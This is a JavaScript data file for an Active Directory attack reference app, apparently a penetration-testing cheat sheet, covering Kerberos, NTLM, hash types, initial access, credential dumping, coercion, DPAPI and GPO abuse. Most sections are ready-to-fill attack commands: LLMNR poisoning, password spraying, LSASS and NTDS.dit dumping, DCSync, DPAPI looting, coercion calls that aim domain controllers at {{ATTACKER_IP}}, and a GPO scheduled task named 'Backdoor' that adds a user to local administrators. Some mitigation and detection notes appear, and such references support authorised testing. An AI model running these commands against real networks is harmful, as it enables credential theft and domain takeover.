/* ============================================================
   AD ARSENAL — Content Data (Part 1: Sections 1-10)
   All attack sections from AD Attack Architecture Map v1.1
   ============================================================ */

// Global sections array — content rendered dynamically
window.ARSENAL_DATA = [

    // ============================================================
    // SECTION 1: AD Basics
    // ============================================================
    {
        id: 'ad-basics',
        title: '// Active Directory Basics for Beginners',
        phase: 'info',
        intro: 'Before attacking AD, understand what it is. These are the building blocks every technique relies on.',
        subsections: [
            {
                title: 'AD Structure Overview',
                type: 'diagram',
                tool: 'REFERENCE',
                content: `FOREST (security boundary)
└── DOMAIN (e.g., corp.local)    // NOT a security boundary
    ├── Domain Controller (DC)    Hosts AD database (NTDS.dit), DNS, Kerberos KDC, LDAP
    ├── Organizational Units (OUs) Containers for users, computers, groups — GPOs link to OUs
    ├── Users                     Each has: SID, NT hash, group memberships, attributes
    ├── Computers                 Machine accounts (COMPUTER$) — also have passwords/hashes
    ├── Groups                    Security groups control access; nesting creates complex paths
    ├── Group Policy Objects      Push config to all machines in linked OUs
    ├── Service Accounts          Accounts running services — often over-privileged with SPNs
    └── CHILD DOMAIN (e.g., eu.corp.local)
        └── Child → Parent escalation is trivial (ExtraSID / raiseChild)`
            },
            {
                title: 'Key AD Objects',
                type: 'list',
                items: [
                    'SID (Security Identifier): Unique ID for every object — e.g., S-1-5-21-...-500 (built-in admin). RID 512 = Domain Admins, 519 = Enterprise Admins',
                    'SPN (Service Principal Name): Links a service to an account — SPNs on user accounts = Kerberoastable',
                    'UPN (User Principal Name): user@domain.local format for authentication',
                    'DN (Distinguished Name): Full LDAP path — CN=Admin,OU=Users,DC=corp,DC=local',
                    'SAM Account Name: Legacy DOMAIN\\\\username format',
                    'DACL: Access Control List on every object — defines who can do what to it'
                ]
            },
            {
                title: 'Trust Types',
                type: 'list',
                items: [
                    'Parent-Child: Automatic, bidirectional, transitive — child can escalate to parent via ExtraSID',
                    'Tree-Root: Connects trees within a forest — transitive, bidirectional',
                    'Forest (External): Between forests — can be one-way or two-way. SID filtering applies',
                    'Shortcut: Optimizes authentication between distant domains in same forest',
                    'Realm: Trust with non-Windows Kerberos (e.g., Linux MIT Kerberos)',
                    'Key concept: Domain ≠ security boundary. Only the forest is a security boundary.'
                ]
            },
            {
                title: 'Critical Groups',
                type: 'list',
                items: [
                    'Domain Admins (RID 512): Full control of the domain — the primary target',
                    'Enterprise Admins (RID 519): Full control of the entire forest (exists only in root domain)',
                    'Schema Admins (RID 518): Can modify the AD schema (rare but devastating)',
                    'Account Operators: Can create/modify most users and groups (often overlooked)',
                    'Backup Operators: Can back up/restore any file including NTDS.dit — DCSync equivalent',
                    'Server Operators: Logon to DCs, manage services — can escalate to DA',
                    'DNSAdmins: Can load arbitrary DLL into DNS service on DC — code execution as SYSTEM',
                    'Protected Users: Defensive group — disables NTLM, forces Kerberos AES, no delegation'
                ]
            },
            {
                title: 'Authentication Protocols',
                type: 'list',
                items: [
                    'Kerberos (port 88): Default for domain auth — ticket-based, uses KDC on DC',
                    'NTLM (embedded): Fallback when Kerberos fails — challenge-response, no mutual auth',
                    'LDAP (389/636): Directory queries — authentication via simple bind or SASL',
                    'SMB (445): File sharing — carries NTLM or Kerberos auth, signing is critical',
                    'WinRM (5985/5986): Remote management — PowerShell remoting',
                    'RDP (3389): Remote desktop — supports NLA (Network Level Authentication)',
                    'When Kerberos fails: IP used instead of hostname, DC unreachable, cross-forest → falls back to NTLM'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 2: Attack Flow Chains
    // ============================================================
    {
        id: 'attack-flows',
        title: '// Attack Flow Chains',
        phase: 'dominance',
        intro: 'Step-by-step attack paths showing how techniques chain together — the connective tissue beginners miss.',
        subsections: [
            {
                title: 'Common Attack Chains',
                type: 'list',
                items: [
                    'RBCD → NT Hash: GenericWrite on computer → addcomputer.py → rbcd.py → getST.py → secretsdump',
                    'PetitPotam → ESC8 → DCSync: Coerce DC → ntlmrelayx to CA web enrollment → DC cert → PKINIT → DCSync',
                    'PrinterBug → Unconstrained Deleg: Coerce DC → TGT cached on unconstrained host → DCSync',
                    'Shadow Creds → NT Hash: GenericWrite on user → write msDS-KeyCredentialLink → certipy shadow auto → NT hash',
                    'Kerberoast Flow: Enumerate SPNs → GetUserSPNs.py → crack TGS hash → authenticate as service account',
                    'AS-REP Roast Flow: Enumerate DONT_REQ_PREAUTH → GetNPUsers.py → crack AS-REP → authenticate',
                    'ACL Abuse Chain: WriteDACL → grant DCSync rights → secretsdump.py → all domain hashes',
                    'GPO Abuse Chain: GenericWrite on GPO → SharpGPOAbuse → scheduled task on all OU machines'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 3: Kerberos Fundamentals
    // ============================================================
    {
        id: 'kerberos',
        title: '// Kerberos Fundamentals',
        phase: 'info',
        intro: 'Understanding Kerberos is essential — every ticket-based attack exploits a specific step in this protocol.',
        subsections: [
            {
                title: 'Kerberos Authentication Flow',
                type: 'diagram',
                tool: 'PROTOCOL',
                content: `Step 1: AS-REQ (Authentication Service Request)
  User → KDC: "I am user X, I want a TGT"
  ├── Encrypted with user's NT hash (password-derived)
  ├── Contains: username, timestamp, requested lifetime
  └── Pre-authentication proves user knows password
      // If DONT_REQ_PREAUTH is set → AS-REP Roasting

Step 2: AS-REP (Authentication Service Reply)
  KDC → User: "Here is your TGT"
  ├── TGT encrypted with krbtgt hash (only KDC can decrypt)
  ├── Session key encrypted with user's NT hash
  └── TGT contains: user identity, PAC, timestamps, session key
      // Golden Ticket = forged TGT using stolen krbtgt hash

Step 3: TGS-REQ (Ticket Granting Service Request)
  User → KDC: "I want to access service Y" (presents TGT)
  ├── Includes TGT + authenticator (encrypted with session key)
  ├── Specifies target SPN (e.g., CIFS/fileserver.domain.local)
  └── KDC does NOT verify user can access service — just issues TGS
      // Kerberoasting: any user can request TGS for any SPN

Step 4: TGS-REP (Ticket Granting Service Reply)
  KDC → User: "Here is your Service Ticket (TGS)"
  ├── TGS encrypted with service account's NT hash
  ├── Contains PAC with user's group memberships
  └── New session key for user ↔ service communication
      // Silver Ticket = forged TGS using stolen service hash

Step 5: AP-REQ (Application Request)
  User → Service: "Here is my ticket, let me in"
  ├── Service decrypts TGS with its own hash
  ├── Validates PAC (optional — many services skip this)
  └── If PAC validation is skipped, Silver Tickets go undetected`
            },
            {
                title: 'TGT (Ticket Granting Ticket)',
                type: 'list',
                items: [
                    'Encrypted with krbtgt account hash — only the KDC can read it',
                    'Contains user identity, PAC (Privilege Attribute Certificate), timestamps',
                    'Default lifetime: 10 hours, renewable for 7 days',
                    'Golden Ticket: forged TGT with arbitrary PAC — requires krbtgt hash',
                    'Diamond Ticket: modifies a legitimate TGT\'s PAC — harder to detect',
                    'Stored in memory (LSASS) or as .kirbi/.ccache files'
                ]
            },
            {
                title: 'TGS (Service Ticket)',
                type: 'list',
                items: [
                    'Encrypted with the target service account\'s NT hash',
                    'Any authenticated user can request a TGS for any SPN — the KDC does not check authorization',
                    'Silver Ticket: forged TGS — never touches KDC, hard to detect',
                    'Kerberoasting: request TGS, extract hash, crack offline',
                    'SPN swap: the service name in the ticket is not encrypted — can be changed post-issuance'
                ]
            },
            {
                title: 'PAC (Privilege Attribute Certificate)',
                type: 'list',
                items: [
                    'Contains: user SID, group SIDs, logon info, resource group memberships',
                    'Signed by krbtgt (server checksum) and KDC (KDC checksum)',
                    'Most services do not validate PAC signatures with the KDC',
                    'MS14-068 (CVE-2014-6324): forged PAC → any user becomes Domain Admin',
                    'ExtraSID attack: inject Enterprise Admin SID (-519) into PAC for forest takeover'
                ]
            },
            {
                title: 'S4U Extensions',
                type: 'list',
                items: [
                    'S4U2Self: Service requests a ticket to itself on behalf of a user (protocol transition)',
                    'S4U2Proxy: Service uses the user\'s ticket to access another service on their behalf',
                    'Constrained Delegation: S4U2Self → S4U2Proxy chain to impersonate any user to allowed SPNs',
                    'RBCD: S4U2Self (forwardable) → S4U2Proxy to target — write-based, no DC config needed',
                    'Key insight: S4U2Self only returns forwardable ticket if TRUSTED_TO_AUTH_FOR_DELEGATION is set',
                    'RBCD trick: RBCD targets accept non-forwardable tickets from S4U2Self — bypasses the check'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 4: NTLM Authentication
    // ============================================================
    {
        id: 'ntlm',
        title: '// NTLM Authentication Basics',
        phase: 'info',
        intro: 'NTLM is the fallback protocol when Kerberos fails — and its weaknesses enable relay, capture, and pass-the-hash attacks.',
        subsections: [
            {
                title: 'NTLM Challenge-Response Flow',
                type: 'diagram',
                tool: 'PROTOCOL',
                content: `Step 1: NEGOTIATE
  Client → Server: "I want to authenticate using NTLM"
  ├── Flags: NTLMSSP_NEGOTIATE_NTLM, NTLMSSP_NEGOTIATE_SEAL, etc.
  └── Indicates supported features (NTLMv1 vs NTLMv2, signing, etc.)

Step 2: CHALLENGE
  Server → Client: "Prove your identity with this challenge"
  ├── Server sends 8-byte random challenge (nonce)
  ├── This challenge can be relayed to another server
  └── Challenge is not tied to the target server identity

Step 3: AUTHENTICATE
  Client → Server: "Here is my response"
  ├── Client computes HMAC-MD5 of challenge using NT hash
  ├── NTLMv1: DES-based, crackable, susceptible to rainbow tables
  ├── NTLMv2: HMAC-MD5 with server+client challenge + timestamp
  └── Response can be captured (Responder) and cracked offline

Why NTLM is dangerous:
  ├── No mutual authentication — client doesn't verify server identity
  ├── Challenge not bound to destination — enables relay attacks
  ├── Pass-the-Hash works because NT hash IS the credential (no salt)
  └── Forced auth via UNC paths, Office docs, profile paths, coercion RPC`
            },
            {
                title: 'NTLMv1 vs NTLMv2',
                type: 'list',
                items: [
                    'NTLMv1: DES-based, 8-byte challenge — trivially crackable, convertible to NT hash via crack.sh',
                    'NTLMv1 + ESS: Extended Session Security adds client challenge but still weak',
                    'NTLMv2: HMAC-MD5 with timestamp + client challenge + target info — harder to crack but still offline-crackable',
                    'Net-NTLMv2: what you capture with Responder — hashcat mode 5600',
                    'Check policy: LMCompatibilityLevel registry value controls version (0-5)',
                    'Downgrade: if NTLMv1 allowed, force downgrade for easier cracking'
                ]
            },
            {
                title: 'NTLM Relay Attack Paths',
                type: 'list',
                items: [
                    'SMB → SMB: Requires signing disabled on target (default on workstations)',
                    'SMB → LDAP(S): Create machine accounts, modify ACLs, set RBCD',
                    'SMB → HTTP: ADCS web enrollment (ESC8), Exchange',
                    'HTTP → LDAP: Works if Extended Protection for Auth is off',
                    'Tools: ntlmrelayx + Responder (--disable-http-server if relaying)',
                    'EPA / Channel Binding: mitigates relay to LDAPS / HTTPS',
                    'SMB Signing required: Blocks SMB relay — check with netexec smb target --gen-relay-list'
                ]
            },
            {
                title: 'Coercion + Relay Combos',
                type: 'list',
                items: [
                    'PetitPotam + ADCS: Coerce DC → relay to CA web enrollment → DC cert → DCSync',
                    'PrinterBug + Unconstrained: Coerce DC to unconstrained host → capture TGT',
                    'DFSCoerce + RBCD: Coerce target → relay to LDAP → set RBCD → impersonate',
                    'WebDAV + Coercion: HTTP-based coercion from internal host → relay to LDAP (no signing check)',
                    'Key requirement: WebDAV (WebClient service) enables HTTP-based coercion on workstations'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 5: Hash Types Reference
    // ============================================================
    {
        id: 'hash-types',
        title: '// Hash Types Reference',
        phase: 'cred',
        intro: 'Know your hashes — each type has different cracking methods, hashcat modes, and exploitation potential.',
        subsections: [
            {
                title: 'AD Hash Types & Hashcat Modes',
                type: 'diagram',
                tool: 'REFERENCE',
                content: `HASH TYPE              HASHCAT   WHERE FOUND
─────────────────────────────────────────────────────────────
NT Hash (NTLM)          1000     SAM, NTDS.dit, LSASS, DCSync
LM Hash                 3000     Legacy SAM (disabled by default)
Net-NTLMv1              5500     Responder capture, coercion
Net-NTLMv2              5600     Responder capture, coercion
AS-REP (Kerberos)      18200     AS-REP Roasting (no preauth)
TGS-REP (Kerberoast)   13100     Kerberoasting (any auth user)
TGS-REP (AES)          19700     AES Kerberoasting (slower crack)
DCC2 (mscachev2)        2100     Cached domain creds (offline)
MsCacheV1               1100     Old cached creds (rare)

CRACKING TIPS
├── NT hashes: No salt → rainbow tables work, instant lookup
├── Net-NTLMv2: Offline crackable but salted with challenge
├── AS-REP / TGS: RC4 = fast (18200/13100), AES = slow (19700)
├── DCC2: Very slow (PBKDF2, 10240 iterations) — targeted only
└── Pass-the-Hash: NT hash IS the credential — no need to crack`
            }
        ]
    },

    // ============================================================
    // SECTION 6: Initial Access
    // ============================================================
    {
        id: 'initial-access',
        title: '// Initial Access',
        phase: 'recon',
        intro: 'Before exploiting AD, you need a foothold. These are the most common ways to obtain initial domain credentials or network position.',
        subsections: [
            {
                title: 'Network Position (No Creds)',
                type: 'commands',
                commands: [
                    { tool: 'Responder', cmd: 'responder -I eth0 -dwPv', desc: 'LLMNR/NBT-NS Poisoning — captures Net-NTLMv2 hashes from broadcast name resolution' },
                    { tool: 'mitm6', cmd: 'mitm6 -d {{DOMAIN}}', desc: 'IPv6 DNS Takeover → WPAD proxy → relay NTLM to LDAP' },
                    { tool: 'netexec', cmd: 'netexec smb {{TARGET_DC}} -u \'\' -p \'\'', desc: 'Null session — test for anonymous LDAP/SMB binds' },
                    { tool: 'netexec', cmd: 'netexec smb {{TARGET_DC}} -u \'guest\' -p \'\'', desc: 'Guest access — some domains leave guest enabled' },
                    { tool: 'impacket', cmd: 'GetNPUsers.py {{DOMAIN}}/ -usersfile users.txt -no-pass -dc-ip {{TARGET_DC}}', desc: 'AS-REP Roasting — only needs a username list, no creds required' }
                ]
            },
            {
                title: 'Password-Based Access',
                type: 'commands',
                commands: [
                    { tool: 'kerbrute', cmd: 'kerbrute passwordspray -d {{DOMAIN}} --dc {{TARGET_DC}} users.txt \'Password1\'', desc: 'Password Spraying via Kerberos — avoids NTLM lockout events on DCs' },
                    { tool: 'netexec', cmd: 'netexec smb {{TARGET_DC}} -u users.txt -p \'Password1\' --continue-on-success', desc: 'Password Spraying via SMB — one password against many users' },
                    { tool: 'Windows', cmd: 'net accounts /domain', desc: 'Always check lockout policy before spraying' }
                ]
            },
            {
                title: 'Phishing / Social Engineering',
                type: 'list',
                items: [
                    'Office macros: Legacy but still works in some orgs (VBA stomping, .docm)',
                    'HTML smuggling: Deliver payload embedded in HTML email attachment',
                    'ISO/IMG/LNK: Bypass Mark-of-the-Web via container files',
                    'Teams / Slack phishing: External messaging often allowed, bypasses email filters',
                    'MFA fatigue / push bombing: Repeated MFA prompts until user approves',
                    'Device code phishing: Abuse OAuth device flow for token theft'
                ]
            },
            {
                title: 'Network-Based Attacks',
                type: 'list',
                items: [
                    'SMB shares: Anonymous/guest readable shares with credentials in scripts, configs',
                    'SYSVOL / GPP: Group Policy Preferences with encrypted passwords (MS14-025, key is public)',
                    'SNMP community strings: Default "public"/"private" → enumerate network',
                    'MSSQL: Default SA password, xp_cmdshell, linked servers',
                    'ADCS web enrollment: Anonymous enrollment possible if misconfigured',
                    'VPN / Citrix / RDWeb: External-facing auth portals for spray attacks'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 7: Credential Dumping Deep Dive
    // ============================================================
    {
        id: 'credential-dumping',
        title: '// Credential Dumping Deep Dive',
        phase: 'cred',
        intro: 'Where credentials live in Windows/AD and how to extract them. Understanding the source determines the hash type and attack potential.',
        subsections: [
            {
                title: 'LSASS Memory',
                type: 'commands',
                commands: [
                    { tool: 'Mimikatz', cmd: 'sekurlsa::logonpasswords', desc: 'Dumps all cached creds from LSASS memory' },
                    { tool: 'lsassy', cmd: 'lsassy -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} {{TARGET_HOST}}', desc: 'Remotely dump LSASS via CrackMapExec or standalone' },
                    { tool: 'procdump', cmd: 'procdump -ma lsass.exe lsass.dmp', desc: 'Dump LSASS to file → offline pypykatz analysis' },
                    { tool: 'pypykatz', cmd: 'pypykatz lsa minidump lsass.dmp', desc: 'Parse LSASS dump offline on Linux' }
                ],
                notes: [
                    'Protection: RunAsPPL (Protected Process Light) — blocks most tools',
                    'PPL bypass: Vulnerable kernel drivers (e.g., RTCore64.sys), PPLdump',
                    'WDigest: Set UseLogonCredential=1 in registry → plaintext passwords in LSASS'
                ]
            },
            {
                title: 'SAM Database',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'secretsdump.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET_HOST}}', desc: 'Online SAM dump using admin creds' },
                    { tool: 'Windows', cmd: 'reg save HKLM\\SAM sam.hiv && reg save HKLM\\SYSTEM system.hiv', desc: 'Offline dump SAM + SYSTEM hives via reg save' }
                ],
                notes: [
                    'Location: C:\\Windows\\System32\\config\\SAM (locked while OS running)',
                    'Local admin reuse: Same local admin password across multiple hosts = lateral movement',
                    'LAPS: Randomizes local admin passwords per-host to prevent reuse'
                ]
            },
            {
                title: 'NTDS.dit (Domain Controller)',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'secretsdump.py -just-dc {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET_DC}}', desc: 'DCSync — replicates hashes remotely' },
                    { tool: 'impacket', cmd: 'secretsdump.py -just-dc-user Administrator {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET_DC}}', desc: 'DCSync single user — more OPSEC-friendly' },
                    { tool: 'Windows', cmd: 'vssadmin create shadow /for=C:', desc: 'Volume Shadow Copy → copy ntds.dit + SYSTEM hive' },
                    { tool: 'impacket', cmd: 'secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL', desc: 'Offline parse of NTDS.dit + SYSTEM hive' }
                ],
                notes: [
                    'Required rights: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All',
                    'Contains: NT hashes, Kerberos keys (AES256/128), password history, supplemental creds'
                ]
            },
            {
                title: 'DCC2 (Domain Cached Credentials)',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL', desc: 'Extract cached domain credentials' },
                    { tool: 'Mimikatz', cmd: 'lsadump::cache', desc: 'Extract DCC2 hashes from registry' },
                    { tool: 'hashcat', cmd: 'hashcat -m 2100 dcc2_hashes.txt wordlist.txt', desc: 'Crack DCC2 — extremely slow (PBKDF2, 10240 iterations)' }
                ],
                notes: [
                    'Location: HKLM\\SECURITY\\Cache registry hive (NL$1 through NL$10)',
                    'Cannot Pass-the-Hash: DCC2 hashes are not NT hashes — must be cracked',
                    'Useful when: Laptop disconnected from network, only cached creds available'
                ]
            },
            {
                title: 'Cached Credentials & All-in-One Dumping',
                type: 'commands',
                commands: [
                    { tool: 'LaZagne', cmd: 'lazagne.exe all', desc: 'All-in-one credential recovery — browsers, Wi-Fi, mail, databases, sysadmin tools (40+ apps)' },
                    { tool: 'Windows', cmd: 'netsh wlan show profile name=WiFiName key=clear', desc: 'Extract Wi-Fi passwords in cleartext' },
                    { tool: 'Windows', cmd: 'cmdkey /list', desc: 'Enumerate Windows Credential Manager saved credentials' },
                    { tool: 'SharpDPAPI', cmd: 'SharpDPAPI.exe triage', desc: 'Decrypt Windows Credential Manager entries programmatically' }
                ],
                notes: [
                    'RDP saved creds: Stored as DPAPI blobs in %LOCALAPPDATA%\\Microsoft\\Credentials\\',
                    'PuTTY / WinSCP / FileZilla: Cleartext or weakly encrypted passwords in registry and XML configs',
                    'goLazagne: Go implementation — cross-platform, compiles to single static binary'
                ]
            },
            {
                title: 'RemoteMonologue',
                type: 'list',
                items: [
                    'Leverages Internal-Monologue technique over DCOM to extract NTLMv1/v2 hashes from remote machines',
                    'No LSASS interaction — avoids EDR detections for process access',
                    'Triggers local NTLM authentication on the remote host via DCOM and captures the resulting hash',
                    'NTLMv1 hashes can be converted to NT hashes via crack.sh or rainbow tables',
                    'OPSEC advantage: Avoids Sysmon Event 10 (LSASS access) and most credential dumping signatures'
                ]
            },
            {
                title: 'goLAPS',
                type: 'list',
                items: [
                    'Reads the ms-Mcs-AdmPwd attribute from computer objects to extract LAPS-managed local admin passwords',
                    'Written in Go — compiles to a single static binary, cross-platform',
                    'Requires: Authenticated domain user with read permissions on ms-Mcs-AdmPwd',
                    'Common finding: Excessive read permissions on LAPS attributes — helpdesk/IT groups can read all',
                    'Use extracted local admin credentials for lateral movement via PtH or direct authentication'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 8: Coercion Techniques
    // ============================================================
    {
        id: 'coercion',
        title: '// Coercion Techniques Breakdown',
        phase: 'lateral',
        intro: 'Force a machine to authenticate to your listener — the trigger for relay and unconstrained delegation attacks.',
        subsections: [
            {
                title: 'PetitPotam (MS-EFSR)',
                type: 'commands',
                commands: [
                    { tool: 'PetitPotam', cmd: 'PetitPotam.py {{ATTACKER_IP}} {{TARGET_DC}} -u {{USERNAME}} -p {{PASSWORD}}', desc: 'Force target to authenticate via SMB (authenticated variant)' },
                    { tool: 'PetitPotam', cmd: 'PetitPotam.py {{ATTACKER_IP}} {{TARGET_DC}}', desc: 'Unauthenticated variant (patched but still found)' }
                ],
                notes: [
                    'Best combo: PetitPotam + ntlmrelayx → ADCS (ESC8) → DC cert → DCSync',
                    'Mitigation: Enable Extended Protection for Auth, require SMB signing, disable NTLM'
                ]
            },
            {
                title: 'PrinterBug / SpoolSample',
                type: 'commands',
                commands: [
                    { tool: 'printerbug', cmd: 'printerbug.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET_DC}} {{ATTACKER_IP}}', desc: 'Force target to authenticate via SMB using Print Spooler' },
                    { tool: 'SpoolSample', cmd: 'SpoolSample.exe {{TARGET_DC}} {{ATTACKER_IP}}', desc: 'Windows variant — requires domain user' }
                ],
                notes: [
                    'Best combo: PrinterBug + Unconstrained Delegation → capture DC TGT',
                    'Mitigation: Disable Print Spooler on DCs — Stop-Service Spooler'
                ]
            },
            {
                title: 'DFSCoerce (MS-DFSNM)',
                type: 'commands',
                commands: [
                    { tool: 'dfscoerce', cmd: 'dfscoerce.py {{ATTACKER_IP}} {{TARGET_DC}} -u {{USERNAME}} -p {{PASSWORD}}', desc: 'DFS namespace RPC coercion — any domain user' }
                ],
                notes: ['Combo: Similar to PetitPotam — relay to LDAP for RBCD or to ADCS']
            },
            {
                title: 'ShadowCoerce (MS-FSRVP)',
                type: 'commands',
                commands: [
                    { tool: 'shadowcoerce', cmd: 'shadowcoerce.py {{ATTACKER_IP}} {{TARGET_DC}} -u {{USERNAME}} -p {{PASSWORD}}', desc: 'File Server VSS Agent coercion — requires auth' }
                ],
                notes: ['Only works on servers with File Server VSS Agent Service running']
            },
            {
                title: 'WebDAV + Coercion',
                type: 'list',
                items: [
                    'WebClient service converts SMB coercion to HTTP authentication',
                    'Why it matters: HTTP auth has no signing → can relay to LDAP/LDAPS',
                    'SMB → LDAP relay blocked by LDAP signing, but HTTP → LDAP is not',
                    'Start WebClient: Search indexer trigger or searchconnector-ms file',
                    'Chain: Trigger coercion (PetitPotam) → WebClient redirects to HTTP → relay to LDAP → RBCD',
                    'Scope: WebClient typically only on workstations, not servers'
                ]
            },
            {
                title: 'Kerberos Relay via CNAME',
                type: 'list',
                items: [
                    'Abuses DNS CNAME records to redirect Kerberos authentication to attacker-controlled services',
                    'CNAME records create an alias — Kerberos follows the alias, authenticating to the canonical name\'s SPN',
                    'Requirements: Ability to create or modify DNS CNAME records (default: any authenticated user for ADIDNS)',
                    'Mitigation: Restrict ADIDNS record creation, monitor for unexpected CNAME record changes'
                ]
            },
            {
                title: 'Reflective Kerberos Relay',
                type: 'list',
                items: [
                    'Self-relay Kerberos authentication back to the originating service on the same machine',
                    'Enables privilege escalation without a second machine — no external relay target needed',
                    'Impact: Local privilege escalation via Kerberos — alternative to NTLM-based relay attacks (e.g., KrbRelayUp)',
                    'Mitigation: Enable LDAP signing and channel binding, restrict service account permissions'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 9: DPAPI Secrets Deep Dive
    // ============================================================
    {
        id: 'dpapi',
        title: '// DPAPI Secrets Deep Dive',
        phase: 'cred',
        intro: 'Windows Data Protection API protects browser passwords, Wi-Fi keys, RDP credentials, and more. Understanding the key hierarchy is essential for extraction.',
        subsections: [
            {
                title: 'DPAPI Key Hierarchy',
                type: 'diagram',
                tool: 'REFERENCE',
                content: `DPAPI KEY HIERARCHY

Domain Backup Key (stored on DC, RSA key pair)
└── Can decrypt ANY domain user's master keys
    // Extract: secretsdump.py -target-ip DC | grep "DPAPI"
    // This is the "god key" for DPAPI in the domain

User Master Key (per-user, rotates every 90 days)
├── Location: %APPDATA%\\Microsoft\\Protect\\{SID}\\{GUID}
├── Protected by: user password hash (domain) or local password
├── Also protected by: Domain Backup Key (domain-joined machines)
└── Used to derive blob-specific keys for each secret

DPAPI Blob (individual encrypted secret)
├── Each secret (password, key, cert) wrapped in a DPAPI blob
├── Blob references which Master Key GUID was used
└── Decrypted by deriving key from Master Key + entropy

WHAT DPAPI PROTECTS
├── Chrome/Edge passwords   Login Data SQLite → DPAPI blob per credential
├── Chrome/Edge cookies     Session cookies → account takeover
├── Windows Credential Mgr  Saved RDP, SMB, web credentials
├── Wi-Fi profiles          WPA2 PSKs stored via DPAPI
├── Certificate private keys User certificate stores
├── Scheduled task creds    Run-as credentials for tasks
└── Azure / Office tokens   Cached OAuth tokens`
            },
            {
                title: 'Remote DPAPI Extraction',
                type: 'commands',
                commands: [
                    { tool: 'DonPAPI', cmd: 'DonPAPI {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET_HOST}}', desc: 'Automated mass DPAPI secret extraction — browsers, creds, Wi-Fi, certs' },
                    { tool: 'dploot', cmd: 'dploot triage -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} {{TARGET_HOST}}', desc: 'Python DPAPI looting — all secrets at once' },
                    { tool: 'SharpDPAPI', cmd: 'SharpDPAPI.exe triage /server:{{TARGET_DC}}', desc: '.NET tool for Windows DPAPI dumps' },
                    { tool: 'netexec', cmd: 'netexec smb {{TARGET_HOST}} -u {{USERNAME}} -p {{PASSWORD}} -M donpapi', desc: 'Quick DPAPI sweep via netexec module' }
                ],
                notes: [
                    'With Domain Backup Key: Decrypt any user\'s secrets without their password',
                    'Without Backup Key: Need user\'s password/hash or LSASS-cached master keys'
                ]
            },
            {
                title: 'Post-Exploitation Gold',
                type: 'list',
                items: [
                    'Browser passwords: Intranet portals, cloud admin panels, personal accounts',
                    'RDP saved creds: Pivot to additional servers the user connects to',
                    'Wi-Fi PSKs: Access to additional network segments (OT, guest, management)',
                    'OAuth tokens: Azure AD, M365, AWS — cloud lateral movement',
                    'VPN credentials: External access persistence',
                    'Certificate private keys: Authenticate as user via PKINIT even after password change'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 10: GPO Abuse
    // ============================================================
    {
        id: 'gpo-abuse',
        title: '// GPO Abuse Deep Dive',
        phase: 'privesc',
        intro: 'Group Policy Objects push configuration to all domain machines. If you can edit a GPO, you control every computer and user it applies to.',
        subsections: [
            {
                title: 'Prerequisites',
                type: 'commands',
                commands: [
                    { tool: 'BloodHound', cmd: 'MATCH (g:GPO) MATCH p=shortestPath((u:User)-[*1..]->(g)) WHERE u.owned=true RETURN p', desc: 'Find writable GPOs from owned users via Cypher query' },
                    { tool: 'Windows', cmd: 'gpresult /r', desc: 'Check which GPOs are applied to current host' }
                ],
                notes: [
                    'Need: GenericWrite, GenericAll, or WriteProperty on the GPO object',
                    'GPO inheritance: GPOs at higher OUs apply unless blocked — domain-level GPOs affect everything'
                ]
            },
            {
                title: 'Exploitation Methods',
                type: 'commands',
                commands: [
                    { tool: 'SharpGPOAbuse', cmd: 'SharpGPOAbuse --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\\SYSTEM" --Command cmd.exe --Arguments "/c net localgroup Administrators {{USERNAME}} /add" --GPOName "VulnGPO"', desc: 'Add scheduled task via GPO — runs on all machines in linked OU' },
                    { tool: 'GPOddity', cmd: 'GPOddity -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} -dc {{TARGET_DC}} -gpo "VulnGPO" -command "cmd /c whoami > C:\\proof.txt"', desc: 'Immediate scheduled task deployment without GPO refresh wait' }
                ],
                notes: [
                    'Startup Script: Add PowerShell/batch script that runs on every boot',
                    'Restricted Groups: Add attacker to local Administrators group on all targets',
                    'Registry modification: Push registry keys (disable AV, enable WDigest, etc.)',
                    'Software install: Deploy MSI package to target machines'
                ]
            },
            {
                title: 'Detection & Cleanup',
                type: 'list',
                items: [
                    'Event 5136: Directory Service Changes — logs GPO modification in AD',
                    'Event 4719: System audit policy changes (if GPO modifies audit config)',
                    'GPO version numbers: Each edit increments version — compare against known-good baseline',
                    'SYSVOL monitoring: File integrity monitoring on \\\\domain\\SYSVOL\\domain\\Policies',
                    'Cleanup: Always restore original GPO state after testing — GPOs affect production systems'
                ]
            }
        ]
    }

]; // End of Part 1 — continued in data2.js
